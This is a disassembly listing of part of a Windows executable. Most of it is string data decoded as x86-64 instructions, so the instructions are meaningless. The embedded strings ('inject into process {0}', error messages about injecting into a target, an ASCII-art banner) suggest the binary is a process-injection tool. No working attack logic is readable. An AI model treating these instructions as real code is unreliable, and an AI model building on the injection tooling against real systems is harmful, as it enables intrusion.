   140002b7c:	6f                   	outsl  (%rsi),(%dx)
   140002b7d:	00 20                	add    %ah,(%rax)
   140002b7f:	00 69 00             	add    %ch,0x0(%rcx)
   140002b82:	6e                   	outsb  (%rsi),(%dx)
   140002b83:	00 6a 00             	add    %ch,0x0(%rdx)
   140002b86:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   140002b8a:	74 00                	je     0x140002b8c
   140002b8c:	20 00                	and    %al,(%rax)
   140002b8e:	69 00 6e 00 74 00    	imul   $0x74006e,(%rax),%eax
   140002b94:	6f                   	outsl  (%rsi),(%dx)
   140002b95:	00 20                	add    %ah,(%rax)
   140002b97:	00 70 00             	add    %dh,0x0(%rax)
   140002b9a:	72 00                	jb     0x140002b9c
   140002b9c:	6f                   	outsl  (%rsi),(%dx)
   140002b9d:	00 63 00             	add    %ah,0x0(%rbx)
   140002ba0:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140002ba4:	73 00                	jae    0x140002ba6
   140002ba6:	20 00                	and    %al,(%rax)
   140002ba8:	7b 00                	jnp    0x140002baa
   140002baa:	30 00                	xor    %al,(%rax)
   140002bac:	7d 00                	jge    0x140002bae
   140002bae:	00 67 5b             	add    %ah,0x5b(%rdi)
   140002bb1:	00 2d 00 5d 00 20    	add    %ch,0x20005d00(%rip)        # 0x1600088b7
   140002bb7:	00 54 00 68          	add    %dl,0x68(%rax,%rax,1)
   140002bbb:	00 65 00             	add    %ah,0x0(%rbp)
   140002bbe:	72 00                	jb     0x140002bc0
   140002bc0:	65 00 20             	add    %ah,%gs:(%rax)
   140002bc3:	00 77 00             	add    %dh,0x0(%rdi)
   140002bc6:	61                   	(bad)
   140002bc7:	00 73 00             	add    %dh,0x0(%rbx)
   140002bca:	20 00                	and    %al,(%rax)
   140002bcc:	61                   	(bad)
   140002bcd:	00 6e 00             	add    %ch,0x0(%rsi)
   140002bd0:	20 00                	and    %al,(%rax)
   140002bd2:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140002bd6:	72 00                	jb     0x140002bd8
   140002bd8:	6f                   	outsl  (%rsi),(%dx)
   140002bd9:	00 72 00             	add    %dh,0x0(%rdx)
   140002bdc:	20 00                	and    %al,(%rax)
   140002bde:	77 00                	ja     0x140002be0
   140002be0:	68 00 69 00 6c       	push   $0x6c006900
   140002be5:	00 65 00             	add    %ah,0x0(%rbp)
   140002be8:	20 00                	and    %al,(%rax)
   140002bea:	69 00 6e 00 6a 00    	imul   $0x6a006e,(%rax),%eax
   140002bf0:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   140002bf4:	74 00                	je     0x140002bf6
   140002bf6:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   140002bfc:	20 00                	and    %al,(%rax)
   140002bfe:	69 00 6e 00 74 00    	imul   $0x74006e,(%rax),%eax
   140002c04:	6f                   	outsl  (%rsi),(%dx)
   140002c05:	00 20                	add    %ah,(%rax)
   140002c07:	00 74 00 61          	add    %dh,0x61(%rax,%rax,1)
   140002c0b:	00 72 00             	add    %dh,0x0(%rdx)
   140002c0e:	67 00 65 00          	add    %ah,0x0(%ebp)
   140002c12:	74 00                	je     0x140002c14
   140002c14:	3a 00                	cmp    (%rax),%al
   140002c16:	01 35 5b 00 2a 00    	add    %esi,0x2a005b(%rip)        # 0x1402a2c77
   140002c1c:	5d                   	pop    %rbp
   140002c1d:	00 20                	add    %ah,(%rax)
   140002c1f:	00 50 00             	add    %dl,0x0(%rax)
   140002c22:	72 00                	jb     0x140002c24
   140002c24:	6f                   	outsl  (%rsi),(%dx)
   140002c25:	00 63 00             	add    %ah,0x0(%rbx)
   140002c28:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140002c2c:	73 00                	jae    0x140002c2e
   140002c2e:	20 00                	and    %al,(%rax)
   140002c30:	7b 00                	jnp    0x140002c32
   140002c32:	30 00                	xor    %al,(%rax)
   140002c34:	7d 00                	jge    0x140002c36
   140002c36:	20 00                	and    %al,(%rax)
   140002c38:	68 00 61 00 73       	push   $0x73006100
   140002c3d:	00 20                	add    %ah,(%rax)
   140002c3f:	00 65 00             	add    %ah,0x0(%rbp)
   140002c42:	78 00                	js     0x140002c44
   140002c44:	69 00 74 00 65 00    	imul   $0x650074,(%rax),%eax
   140002c4a:	64 00 00             	add    %al,%fs:(%rax)
   140002c4d:	83 d1 20             	adc    $0x20,%ecx
   140002c50:	00 20                	add    %ah,(%rax)
   140002c52:	00 23                	add    %ah,(%rbx)
   140002c54:	00 20                	add    %ah,(%rax)
   140002c56:	00 23                	add    %ah,(%rbx)
   140002c58:	00 20                	add    %ah,(%rax)
   140002c5a:	00 20                	add    %ah,(%rax)
   140002c5c:	00 20                	add    %ah,(%rax)
   140002c5e:	00 23                	add    %ah,(%rbx)
   140002c60:	00 23                	add    %ah,(%rbx)
   140002c62:	00 23                	add    %ah,(%rbx)
   140002c64:	00 23                	add    %ah,(%rbx)
   140002c66:	00 23                	add    %ah,(%rbx)
   140002c68:	00 23                	add    %ah,(%rbx)
   140002c6a:	00 20                	add    %ah,(%rax)
   140002c6c:	00 20                	add    %ah,(%rax)
   140002c6e:	00 23                	add    %ah,(%rbx)
   140002c70:	00 23                	add    %ah,(%rbx)
   140002c72:	00 23                	add    %ah,(%rbx)
   140002c74:	00 23                	add    %ah,(%rbx)
   140002c76:	00 23                	add    %ah,(%rbx)
   140002c78:	00 23                	add    %ah,(%rbx)
   140002c7a:	00 20                	add    %ah,(%rax)
   140002c7c:	00 20                	add    %ah,(%rax)
   140002c7e:	00 23                	add    %ah,(%rbx)
   140002c80:	00 23                	add    %ah,(%rbx)
   140002c82:	00 23                	add    %ah,(%rbx)
   140002c84:	00 23                	add    %ah,(%rbx)
   140002c86:	00 23                	add    %ah,(%rbx)
   140002c88:	00 23                	add    %ah,(%rbx)
   140002c8a:	00 20                	add    %ah,(%rax)
   140002c8c:	00 20                	add    %ah,(%rax)
   140002c8e:	00 23                	add    %ah,(%rbx)
   140002c90:	00 23                	add    %ah,(%rbx)
   140002c92:	00 23                	add    %ah,(%rbx)
   140002c94:	00 23                	add    %ah,(%rbx)
   140002c96:	00 23                	add    %ah,(%rbx)
   140002c98:	00 23                	add    %ah,(%rbx)
   140002c9a:	00 23                	add    %ah,(%rbx)
   140002c9c:	00 20                	add    %ah,(%rax)
   140002c9e:	00 23                	add    %ah,(%rbx)
   140002ca0:	00 20                	add    %ah,(%rax)
   140002ca2:	00 20                	add    %ah,(%rax)
   140002ca4:	00 20                	add    %ah,(%rax)
   140002ca6:	00 20                	add    %ah,(%rax)
   140002ca8:	00 20                	add    %ah,(%rax)
   140002caa:	00 23                	add    %ah,(%rbx)
   140002cac:	00 20                	add    %ah,(%rax)
   140002cae:	00 23                	add    %ah,(%rbx)
   140002cb0:	00 23                	add    %ah,(%rbx)
   140002cb2:	00 23                	add    %ah,(%rbx)
   140002cb4:	00 20                	add    %ah,(%rax)
   140002cb6:	00 23                	add    %ah,(%rbx)
   140002cb8:	00 23                	add    %ah,(%rbx)
   140002cba:	00 23                	add    %ah,(%rbx)
   140002cbc:	00 23                	add    %ah,(%rbx)
   140002cbe:	00 23                	add    %ah,(%rbx)
   140002cc0:	00 23                	add    %ah,(%rbx)
   140002cc2:	00 23                	add    %ah,(%rbx)
   140002cc4:	00 20                	add    %ah,(%rax)
   140002cc6:	00 23                	add    %ah,(%rbx)
   140002cc8:	00 23                	add    %ah,(%rbx)
   140002cca:	00 23                	add    %ah,(%rbx)
   140002ccc:	00 23                	add    %ah,(%rbx)
   140002cce:	00 23                	add    %ah,(%rbx)
   140002cd0:	00 23                	add    %ah,(%rbx)
   140002cd2:	00 23                	add    %ah,(%rbx)
   140002cd4:	00 20                	add    %ah,(%rax)
   140002cd6:	00 0d 00 0a 00 20    	add    %cl,0x20000a00(%rip)        # 0x1600036dc
   140002cdc:	00 20                	add    %ah,(%rax)
   140002cde:	00 23                	add    %ah,(%rbx)
   140002ce0:	00 20                	add    %ah,(%rax)
   140002ce2:	00 23                	add    %ah,(%rbx)
   140002ce4:	00 20                	add    %ah,(%rax)
   140002ce6:	00 20                	add    %ah,(%rax)
   140002ce8:	00 20                	add    %ah,(%rax)
   140002cea:	00 23                	add    %ah,(%rbx)
   140002cec:	00 20                	add    %ah,(%rax)
   140002cee:	00 20                	add    %ah,(%rax)
   140002cf0:	00 20                	add    %ah,(%rax)
   140002cf2:	00 20                	add    %ah,(%rax)
   140002cf4:	00 20                	add    %ah,(%rax)
   140002cf6:	00 23                	add    %ah,(%rbx)
   140002cf8:	00 20                	add    %ah,(%rax)
   140002cfa:	00 23                	add    %ah,(%rbx)
   140002cfc:	00 20                	add    %ah,(%rax)
   140002cfe:	00 20                	add    %ah,(%rax)
   140002d00:	00 20                	add    %ah,(%rax)
   140002d02:	00 20                	add    %ah,(%rax)
   140002d04:	00 20                	add    %ah,(%rax)
   140002d06:	00 23                	add    %ah,(%rbx)
   140002d08:	00 20                	add    %ah,(%rax)
   140002d0a:	00 23                	add    %ah,(%rbx)
   140002d0c:	00 20                	add    %ah,(%rax)
   140002d0e:	00 20                	add    %ah,(%rax)
   140002d10:	00 20                	add    %ah,(%rax)
   140002d12:	00 20                	add    %ah,(%rax)
   140002d14:	00 20                	add    %ah,(%rax)
   140002d16:	00 23                	add    %ah,(%rbx)
   140002d18:	00 20                	add    %ah,(%rax)
   140002d1a:	00 20                	add    %ah,(%rax)
   140002d1c:	00 20                	add    %ah,(%rax)
   140002d1e:	00 20                	add    %ah,(%rax)
   140002d20:	00 23                	add    %ah,(%rbx)
   140002d22:	00 20                	add    %ah,(%rax)
   140002d24:	00 20                	add    %ah,(%rax)
   140002d26:	00 20                	add    %ah,(%rax)
   140002d28:	00 20                	add    %ah,(%rax)
   140002d2a:	00 23                	add    %ah,(%rbx)
   140002d2c:	00 20                	add    %ah,(%rax)
   140002d2e:	00 20                	add    %ah,(%rax)
   140002d30:	00 20                	add    %ah,(%rax)
   140002d32:	00 20                	add    %ah,(%rax)
   140002d34:	00 20                	add    %ah,(%rax)
   140002d36:	00 23                	add    %ah,(%rbx)
   140002d38:	00 20                	add    %ah,(%rax)
   140002d3a:	00 20                	add    %ah,(%rax)
   140002d3c:	00 23                	add    %ah,(%rbx)
   140002d3e:	00 20                	add    %ah,(%rax)
   140002d40:	00 20                	add    %ah,(%rax)
   140002d42:	00 23                	add    %ah,(%rbx)
   140002d44:	00 20                	add    %ah,(%rax)
   140002d46:	00 20                	add    %ah,(%rax)
   140002d48:	00 20                	add    %ah,(%rax)
   140002d4a:	00 20                	add    %ah,(%rax)
   140002d4c:	00 20                	add    %ah,(%rax)
   140002d4e:	00 20                	add    %ah,(%rax)
   140002d50:	00 20                	add    %ah,(%rax)
   140002d52:	00 23                	add    %ah,(%rbx)
   140002d54:	00 20                	add    %ah,(%rax)
   140002d56:	00 20                	add    %ah,(%rax)
   140002d58:	00 20                	add    %ah,(%rax)
   140002d5a:	00 20                	add    %ah,(%rax)
   140002d5c:	00 20                	add    %ah,(%rax)
   140002d5e:	00 20                	add    %ah,(%rax)
   140002d60:	00 20                	add    %ah,(%rax)
   140002d62:	00 0d 00 0a 00 23    	add    %cl,0x23000a00(%rip)        # 0x163003768
   140002d68:	00 23                	add    %ah,(%rbx)
   140002d6a:	00 23                	add    %ah,(%rbx)
   140002d6c:	00 23                	add    %ah,(%rbx)
   140002d6e:	00 23                	add    %ah,(%rbx)
   140002d70:	00 23                	add    %ah,(%rbx)
   140002d72:	00 23                	add    %ah,(%rbx)
   140002d74:	00 20                	add    %ah,(%rax)
   140002d76:	00 23                	add    %ah,(%rbx)
   140002d78:	00 20                	add    %ah,(%rax)
   140002d7a:	00 20                	add    %ah,(%rax)
   140002d7c:	00 20                	add    %ah,(%rax)
   140002d7e:	00 20                	add    %ah,(%rax)
   140002d80:	00 20                	add    %ah,(%rax)
   140002d82:	00 23                	add    %ah,(%rbx)
   140002d84:	00 20                	add    %ah,(%rax)
   140002d86:	00 23                	add    %ah,(%rbx)
   140002d88:	00 20                	add    %ah,(%rax)
   140002d8a:	00 20                	add    %ah,(%rax)
   140002d8c:	00 20                	add    %ah,(%rax)
   140002d8e:	00 20                	add    %ah,(%rax)
   140002d90:	00 20                	add    %ah,(%rax)
   140002d92:	00 23                	add    %ah,(%rbx)
   140002d94:	00 20                	add    %ah,(%rax)
   140002d96:	00 23                	add    %ah,(%rbx)
   140002d98:	00 20                	add    %ah,(%rax)
   140002d9a:	00 20                	add    %ah,(%rax)
   140002d9c:	00 20                	add    %ah,(%rax)
   140002d9e:	00 20                	add    %ah,(%rax)
   140002da0:	00 20                	add    %ah,(%rax)
   140002da2:	00 23                	add    %ah,(%rbx)
   140002da4:	00 20                	add    %ah,(%rax)
   140002da6:	00 20                	add    %ah,(%rax)
   140002da8:	00 20                	add    %ah,(%rax)
   140002daa:	00 20                	add    %ah,(%rax)
   140002dac:	00 23                	add    %ah,(%rbx)
   140002dae:	00 20                	add    %ah,(%rax)
   140002db0:	00 20                	add    %ah,(%rax)
   140002db2:	00 20                	add    %ah,(%rax)
   140002db4:	00 20                	add    %ah,(%rax)
   140002db6:	00 23                	add    %ah,(%rbx)
   140002db8:	00 20                	add    %ah,(%rax)
   140002dba:	00 20                	add    %ah,(%rax)
   140002dbc:	00 20                	add    %ah,(%rax)
   140002dbe:	00 20                	add    %ah,(%rax)
   140002dc0:	00 20                	add    %ah,(%rax)
   140002dc2:	00 23                	add    %ah,(%rbx)
   140002dc4:	00 20                	add    %ah,(%rax)
   140002dc6:	00 20                	add    %ah,(%rax)
   140002dc8:	00 23                	add    %ah,(%rbx)
   140002dca:	00 20                	add    %ah,(%rax)
   140002dcc:	00 20                	add    %ah,(%rax)
   140002dce:	00 23                	add    %ah,(%rbx)
   140002dd0:	00 20                	add    %ah,(%rax)
   140002dd2:	00 20                	add    %ah,(%rax)
   140002dd4:	00 20                	add    %ah,(%rax)
   140002dd6:	00 20                	add    %ah,(%rax)
   140002dd8:	00 20                	add    %ah,(%rax)
   140002dda:	00 20                	add    %ah,(%rax)
   140002ddc:	00 20                	add    %ah,(%rax)
   140002dde:	00 23                	add    %ah,(%rbx)
   140002de0:	00 20                	add    %ah,(%rax)
   140002de2:	00 20                	add    %ah,(%rax)
   140002de4:	00 20                	add    %ah,(%rax)
   140002de6:	00 20                	add    %ah,(%rax)
   140002de8:	00 20                	add    %ah,(%rax)
   140002dea:	00 20                	add    %ah,(%rax)
   140002dec:	00 20                	add    %ah,(%rax)
   140002dee:	00 0d 00 0a 00 20    	add    %cl,0x20000a00(%rip)        # 0x1600037f4
   140002df4:	00 20                	add    %ah,(%rax)
   140002df6:	00 23                	add    %ah,(%rbx)
   140002df8:	00 20                	add    %ah,(%rax)
   140002dfa:	00 23                	add    %ah,(%rbx)
   140002dfc:	00 20                	add    %ah,(%rax)
   140002dfe:	00 20                	add    %ah,(%rax)
   140002e00:	00 20                	add    %ah,(%rax)
   140002e02:	00 23                	add    %ah,(%rbx)
   140002e04:	00 23                	add    %ah,(%rbx)
   140002e06:	00 23                	add    %ah,(%rbx)
   140002e08:	00 23                	add    %ah,(%rbx)
   140002e0a:	00 23                	add    %ah,(%rbx)
   140002e0c:	00 23                	add    %ah,(%rbx)
   140002e0e:	00 20                	add    %ah,(%rax)
   140002e10:	00 20                	add    %ah,(%rax)
   140002e12:	00 23                	add    %ah,(%rbx)
   140002e14:	00 20                	add    %ah,(%rax)
   140002e16:	00 20                	add    %ah,(%rax)
   140002e18:	00 20                	add    %ah,(%rax)
   140002e1a:	00 20                	add    %ah,(%rax)
   140002e1c:	00 20                	add    %ah,(%rax)
   140002e1e:	00 23                	add    %ah,(%rbx)
   140002e20:	00 20                	add    %ah,(%rax)
   140002e22:	00 23                	add    %ah,(%rbx)
   140002e24:	00 23                	add    %ah,(%rbx)
   140002e26:	00 23                	add    %ah,(%rbx)
   140002e28:	00 23                	add    %ah,(%rbx)
   140002e2a:	00 23                	add    %ah,(%rbx)
   140002e2c:	00 23                	add    %ah,(%rbx)
   140002e2e:	00 20                	add    %ah,(%rax)
   140002e30:	00 20                	add    %ah,(%rax)
   140002e32:	00 20                	add    %ah,(%rax)
   140002e34:	00 20                	add    %ah,(%rax)
   140002e36:	00 20                	add    %ah,(%rax)
   140002e38:	00 23                	add    %ah,(%rbx)
   140002e3a:	00 20                	add    %ah,(%rax)
   140002e3c:	00 20                	add    %ah,(%rax)
   140002e3e:	00 20                	add    %ah,(%rax)
   140002e40:	00 20                	add    %ah,(%rax)
   140002e42:	00 23                	add    %ah,(%rbx)
   140002e44:	00 23                	add    %ah,(%rbx)
   140002e46:	00 23                	add    %ah,(%rbx)
   140002e48:	00 23                	add    %ah,(%rbx)
   140002e4a:	00 23                	add    %ah,(%rbx)
   140002e4c:	00 23                	add    %ah,(%rbx)
   140002e4e:	00 23                	add    %ah,(%rbx)
   140002e50:	00 20                	add    %ah,(%rax)
   140002e52:	00 20                	add    %ah,(%rax)
   140002e54:	00 23                	add    %ah,(%rbx)
   140002e56:	00 20                	add    %ah,(%rax)
   140002e58:	00 20                	add    %ah,(%rax)
   140002e5a:	00 23                	add    %ah,(%rbx)
   140002e5c:	00 23                	add    %ah,(%rbx)
   140002e5e:	00 23                	add    %ah,(%rbx)
   140002e60:	00 23                	add    %ah,(%rbx)
   140002e62:	00 23                	add    %ah,(%rbx)
   140002e64:	00 20                	add    %ah,(%rax)
   140002e66:	00 20                	add    %ah,(%rax)
   140002e68:	00 20                	add    %ah,(%rax)
   140002e6a:	00 23                	add    %ah,(%rbx)
   140002e6c:	00 23                	add    %ah,(%rbx)
   140002e6e:	00 23                	add    %ah,(%rbx)
   140002e70:	00 23                	add    %ah,(%rbx)
   140002e72:	00 23                	add    %ah,(%rbx)
   140002e74:	00 20                	add    %ah,(%rax)
   140002e76:	00 20                	add    %ah,(%rax)
   140002e78:	00 20                	add    %ah,(%rax)
   140002e7a:	00 0d 00 0a 00 23    	add    %cl,0x23000a00(%rip)        # 0x163003880
   140002e80:	00 23                	add    %ah,(%rbx)
   140002e82:	00 23                	add    %ah,(%rbx)
   140002e84:	00 23                	add    %ah,(%rbx)
   140002e86:	00 23                	add    %ah,(%rbx)
   140002e88:	00 23                	add    %ah,(%rbx)
   140002e8a:	00 23                	add    %ah,(%rbx)
   140002e8c:	00 20                	add    %ah,(%rax)
   140002e8e:	00 23                	add    %ah,(%rbx)
   140002e90:	00 20                	add    %ah,(%rax)
   140002e92:	00 20                	add    %ah,(%rax)
   140002e94:	00 20                	add    %ah,(%rax)
   140002e96:	00 23                	add    %ah,(%rbx)
   140002e98:	00 20                	add    %ah,(%rax)
   140002e9a:	00 20                	add    %ah,(%rax)
   140002e9c:	00 20                	add    %ah,(%rax)
   140002e9e:	00 23                	add    %ah,(%rbx)
   140002ea0:	00 20                	add    %ah,(%rax)
   140002ea2:	00 20                	add    %ah,(%rax)
   140002ea4:	00 20                	add    %ah,(%rax)
   140002ea6:	00 20                	add    %ah,(%rax)
   140002ea8:	00 20                	add    %ah,(%rax)
   140002eaa:	00 23                	add    %ah,(%rbx)
   140002eac:	00 20                	add    %ah,(%rax)
   140002eae:	00 23                	add    %ah,(%rbx)
   140002eb0:	00 20                	add    %ah,(%rax)
   140002eb2:	00 20                	add    %ah,(%rax)
   140002eb4:	00 20                	add    %ah,(%rax)
   140002eb6:	00 20                	add    %ah,(%rax)
   140002eb8:	00 20                	add    %ah,(%rax)
   140002eba:	00 20                	add    %ah,(%rax)
   140002ebc:	00 20                	add    %ah,(%rax)
   140002ebe:	00 20                	add    %ah,(%rax)
   140002ec0:	00 20                	add    %ah,(%rax)
   140002ec2:	00 20                	add    %ah,(%rax)
   140002ec4:	00 23                	add    %ah,(%rbx)
   140002ec6:	00 20                	add    %ah,(%rax)
   140002ec8:	00 20                	add    %ah,(%rax)
   140002eca:	00 20                	add    %ah,(%rax)
   140002ecc:	00 20                	add    %ah,(%rax)
   140002ece:	00 23                	add    %ah,(%rbx)
   140002ed0:	00 20                	add    %ah,(%rax)
   140002ed2:	00 20                	add    %ah,(%rax)
   140002ed4:	00 20                	add    %ah,(%rax)
   140002ed6:	00 20                	add    %ah,(%rax)
   140002ed8:	00 20                	add    %ah,(%rax)
   140002eda:	00 23                	add    %ah,(%rbx)
   140002edc:	00 20                	add    %ah,(%rax)
   140002ede:	00 20                	add    %ah,(%rax)
   140002ee0:	00 23                	add    %ah,(%rbx)
   140002ee2:	00 20                	add    %ah,(%rax)
   140002ee4:	00 20                	add    %ah,(%rax)
   140002ee6:	00 23                	add    %ah,(%rbx)
   140002ee8:	00 20                	add    %ah,(%rax)
   140002eea:	00 20                	add    %ah,(%rax)
   140002eec:	00 20                	add    %ah,(%rax)
   140002eee:	00 20                	add    %ah,(%rax)
   140002ef0:	00 20                	add    %ah,(%rax)
   140002ef2:	00 20                	add    %ah,(%rax)
   140002ef4:	00 20                	add    %ah,(%rax)
   140002ef6:	00 23                	add    %ah,(%rbx)
   140002ef8:	00 20                	add    %ah,(%rax)
   140002efa:	00 20                	add    %ah,(%rax)
   140002efc:	00 20                	add    %ah,(%rax)
   140002efe:	00 20                	add    %ah,(%rax)
   140002f00:	00 20                	add    %ah,(%rax)
   140002f02:	00 20                	add    %ah,(%rax)
   140002f04:	00 20                	add    %ah,(%rax)
   140002f06:	00 0d 00 0a 00 20    	add    %cl,0x20000a00(%rip)        # 0x16000390c
   140002f0c:	00 20                	add    %ah,(%rax)
   140002f0e:	00 23                	add    %ah,(%rbx)
   140002f10:	00 20                	add    %ah,(%rax)
   140002f12:	00 23                	add    %ah,(%rbx)
   140002f14:	00 20                	add    %ah,(%rax)
   140002f16:	00 20                	add    %ah,(%rax)
   140002f18:	00 20                	add    %ah,(%rax)
   140002f1a:	00 23                	add    %ah,(%rbx)
   140002f1c:	00 20                	add    %ah,(%rax)
   140002f1e:	00 20                	add    %ah,(%rax)
   140002f20:	00 20                	add    %ah,(%rax)
   140002f22:	00 20                	add    %ah,(%rax)
   140002f24:	00 23                	add    %ah,(%rbx)
   140002f26:	00 20                	add    %ah,(%rax)
   140002f28:	00 20                	add    %ah,(%rax)
   140002f2a:	00 23                	add    %ah,(%rbx)
   140002f2c:	00 20                	add    %ah,(%rax)
   140002f2e:	00 20                	add    %ah,(%rax)
   140002f30:	00 20                	add    %ah,(%rax)
   140002f32:	00 20                	add    %ah,(%rax)
   140002f34:	00 20                	add    %ah,(%rax)
   140002f36:	00 23                	add    %ah,(%rbx)
   140002f38:	00 20                	add    %ah,(%rax)
   140002f3a:	00 23                	add    %ah,(%rbx)
   140002f3c:	00 20                	add    %ah,(%rax)
   140002f3e:	00 20                	add    %ah,(%rax)
   140002f40:	00 20                	add    %ah,(%rax)
   140002f42:	00 20                	add    %ah,(%rax)
   140002f44:	00 20                	add    %ah,(%rax)
   140002f46:	00 20                	add    %ah,(%rax)
   140002f48:	00 20                	add    %ah,(%rax)
   140002f4a:	00 20                	add    %ah,(%rax)
   140002f4c:	00 20                	add    %ah,(%rax)
   140002f4e:	00 20                	add    %ah,(%rax)
   140002f50:	00 23                	add    %ah,(%rbx)
   140002f52:	00 20                	add    %ah,(%rax)
   140002f54:	00 20                	add    %ah,(%rax)
   140002f56:	00 20                	add    %ah,(%rax)
   140002f58:	00 20                	add    %ah,(%rax)
   140002f5a:	00 23                	add    %ah,(%rbx)
   140002f5c:	00 20                	add    %ah,(%rax)
   140002f5e:	00 20                	add    %ah,(%rax)
   140002f60:	00 20                	add    %ah,(%rax)
   140002f62:	00 20                	add    %ah,(%rax)
   140002f64:	00 20                	add    %ah,(%rax)
   140002f66:	00 23                	add    %ah,(%rbx)
   140002f68:	00 20                	add    %ah,(%rax)
   140002f6a:	00 20                	add    %ah,(%rax)
   140002f6c:	00 23                	add    %ah,(%rbx)
   140002f6e:	00 20                	add    %ah,(%rax)
   140002f70:	00 20                	add    %ah,(%rax)
   140002f72:	00 23                	add    %ah,(%rbx)
   140002f74:	00 20                	add    %ah,(%rax)
   140002f76:	00 20                	add    %ah,(%rax)
   140002f78:	00 20                	add    %ah,(%rax)
   140002f7a:	00 20                	add    %ah,(%rax)
   140002f7c:	00 20                	add    %ah,(%rax)
   140002f7e:	00 20                	add    %ah,(%rax)
   140002f80:	00 20                	add    %ah,(%rax)
   140002f82:	00 23                	add    %ah,(%rbx)
   140002f84:	00 20                	add    %ah,(%rax)
   140002f86:	00 20                	add    %ah,(%rax)
   140002f88:	00 20                	add    %ah,(%rax)
   140002f8a:	00 20                	add    %ah,(%rax)
   140002f8c:	00 20                	add    %ah,(%rax)
   140002f8e:	00 20                	add    %ah,(%rax)
   140002f90:	00 20                	add    %ah,(%rax)
   140002f92:	00 0d 00 0a 00 20    	add    %cl,0x20000a00(%rip)        # 0x160003998
   140002f98:	00 20                	add    %ah,(%rax)
   140002f9a:	00 23                	add    %ah,(%rbx)
   140002f9c:	00 20                	add    %ah,(%rax)
   140002f9e:	00 23                	add    %ah,(%rbx)
   140002fa0:	00 20                	add    %ah,(%rax)
   140002fa2:	00 20                	add    %ah,(%rax)
   140002fa4:	00 20                	add    %ah,(%rax)
   140002fa6:	00 23                	add    %ah,(%rbx)
   140002fa8:	00 20                	add    %ah,(%rax)
   140002faa:	00 20                	add    %ah,(%rax)
   140002fac:	00 20                	add    %ah,(%rax)
   140002fae:	00 20                	add    %ah,(%rax)
   140002fb0:	00 20                	add    %ah,(%rax)
   140002fb2:	00 23                	add    %ah,(%rbx)
   140002fb4:	00 20                	add    %ah,(%rax)
   140002fb6:	00 23                	add    %ah,(%rbx)
   140002fb8:	00 23                	add    %ah,(%rbx)
   140002fba:	00 23                	add    %ah,(%rbx)
   140002fbc:	00 23                	add    %ah,(%rbx)
   140002fbe:	00 23                	add    %ah,(%rbx)
   140002fc0:	00 23                	add    %ah,(%rbx)
   140002fc2:	00 20                	add    %ah,(%rax)
   140002fc4:	00 20                	add    %ah,(%rax)
   140002fc6:	00 23                	add    %ah,(%rbx)
   140002fc8:	00 20                	add    %ah,(%rax)
   140002fca:	00 20                	add    %ah,(%rax)
   140002fcc:	00 20                	add    %ah,(%rax)
   140002fce:	00 20                	add    %ah,(%rax)
   140002fd0:	00 20                	add    %ah,(%rax)
   140002fd2:	00 20                	add    %ah,(%rax)
   140002fd4:	00 20                	add    %ah,(%rax)
   140002fd6:	00 20                	add    %ah,(%rax)
   140002fd8:	00 20                	add    %ah,(%rax)
   140002fda:	00 20                	add    %ah,(%rax)
   140002fdc:	00 23                	add    %ah,(%rbx)
   140002fde:	00 20                	add    %ah,(%rax)
   140002fe0:	00 20                	add    %ah,(%rax)
   140002fe2:	00 20                	add    %ah,(%rax)
   140002fe4:	00 20                	add    %ah,(%rax)
   140002fe6:	00 23                	add    %ah,(%rbx)
   140002fe8:	00 20                	add    %ah,(%rax)
   140002fea:	00 20                	add    %ah,(%rax)
   140002fec:	00 20                	add    %ah,(%rax)
   140002fee:	00 20                	add    %ah,(%rax)
   140002ff0:	00 20                	add    %ah,(%rax)
   140002ff2:	00 23                	add    %ah,(%rbx)
   140002ff4:	00 20                	add    %ah,(%rax)
   140002ff6:	00 23                	add    %ah,(%rbx)
   140002ff8:	00 23                	add    %ah,(%rbx)
   140002ffa:	00 23                	add    %ah,(%rbx)
   140002ffc:	00 20                	add    %ah,(%rax)
   140002ffe:	00 23                	add    %ah,(%rbx)
   140003000:	00 23                	add    %ah,(%rbx)
   140003002:	00 23                	add    %ah,(%rbx)
   140003004:	00 23                	add    %ah,(%rbx)
   140003006:	00 23                	add    %ah,(%rbx)
   140003008:	00 23                	add    %ah,(%rbx)
   14000300a:	00 23                	add    %ah,(%rbx)
   14000300c:	00 20                	add    %ah,(%rax)
   14000300e:	00 23                	add    %ah,(%rbx)
   140003010:	00 20                	add    %ah,(%rax)
   140003012:	00 20                	add    %ah,(%rax)
   140003014:	00 20                	add    %ah,(%rax)
   140003016:	00 20                	add    %ah,(%rax)
   140003018:	00 20                	add    %ah,(%rax)
   14000301a:	00 20                	add    %ah,(%rax)
   14000301c:	00 20                	add    %ah,(%rax)
   14000301e:	00 00                	add    %al,(%rax)
   140003020:	2a dc                	sub    %ah,%bl
   140003022:	f7 ea                	imul   %edx
   140003024:	94                   	xchg   %eax,%esp
   140003025:	d4                   	(bad)
   140003026:	9f                   	lahf
   140003027:	47 81 0a b0 55 90 d2 	rex.RXB orl $0xd29055b0,(%r10)
   14000302e:	37                   	(bad)
   14000302f:	90                   	nop
   140003030:	00 08                	add    %cl,(%rax)
   140003032:	b7 7a                	mov    $0x7a,%bh
   140003034:	5c                   	pop    %rsp
   140003035:	56                   	push   %rsi
   140003036:	19 34 e0             	sbb    %esi,(%rax,%riz,8)
   140003039:	89 05 00 01 01 1d    	mov    %eax,0x1d010100(%rip)        # 0x15d01313f
   14000303f:	0e                   	(bad)
   140003040:	03 00                	add    (%rax),%eax
   140003042:	00 01                	add    %al,(%rcx)
   140003044:	03 20                	add    (%rax),%esp
   140003046:	00 01                	add    %al,(%rcx)
   140003048:	04 20                	add    $0x20,%al
   14000304a:	01 01                	add    %eax,(%rcx)
   14000304c:	0e                   	(bad)
   14000304d:	04 20                	add    $0x20,%al
   14000304f:	01 01                	add    %eax,(%rcx)
   140003051:	02 05 20 01 01 11    	add    0x11010120(%rip),%al        # 0x151013177
   140003057:	41 04 20             	rex.B add $0x20,%al
   14000305a:	01 01                	add    %eax,(%rcx)
   14000305c:	08 06                	or     %al,(%rsi)
   14000305e:	15 12 4d 01 12       	adc    $0x12014d12,%eax
   140003063:	51                   	push   %rcx
   140003064:	05 15 12 4d 01       	add    $0x14d1215,%eax
   140003069:	08 04 00             	or     %al,(%rax,%rax,1)
   14000306c:	01 01                	add    %eax,(%rcx)
   14000306e:	0e                   	(bad)
